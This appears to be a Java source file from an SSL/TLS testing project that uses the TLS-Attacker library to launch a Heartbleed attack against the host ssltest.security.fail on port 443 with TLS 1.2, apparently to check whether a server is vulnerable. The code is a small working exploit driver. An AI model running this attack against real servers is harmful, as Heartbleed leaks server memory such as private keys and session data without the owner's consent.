package de.dogcraft.ssltest;

import java.util.ArrayList;
import java.util.Arrays;

import de.rub.nds.tlsattacker.attacks.config.HeartbleedCommandConfig;
import de.rub.nds.tlsattacker.attacks.impl.HeartbleedAttack;
import de.rub.nds.tlsattacker.tls.Attacker;
import de.rub.nds.tlsattacker.tls.config.ClientCommandConfig;
import de.rub.nds.tlsattacker.tls.config.ConfigHandler;
import de.rub.nds.tlsattacker.tls.config.ConfigHandlerFactory;
import de.rub.nds.tlsattacker.tls.config.GeneralConfig;
import de.rub.nds.tlsattacker.tls.constants.ProtocolVersion;

public class TLSAttackerClient {

    public static void main(String[] args) {
        GeneralConfig generalConfig = new GeneralConfig();
        generalConfig.setQuiet(false);
        generalConfig.setDebug(true);

        HeartbleedCommandConfig heartbleed = new HeartbleedCommandConfig();
        heartbleed.setConnect("ssltest.security.fail:443");
        heartbleed.setProtocolVersion(ProtocolVersion.TLS12);
        heartbleed.setCipherSuites(new ArrayList<de.rub.nds.tlsattacker.tls.constants.CipherSuite>(Arrays.asList(de.rub.nds.tlsattacker.tls.constants.CipherSuite.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA)));

        Attacker attacker = new HeartbleedAttack(heartbleed);

        ConfigHandler configHandler = ConfigHandlerFactory.createConfigHandler(ClientCommandConfig.COMMAND);
        configHandler.initialize(generalConfig);

        attacker.executeAttack(configHandler);
    }

}
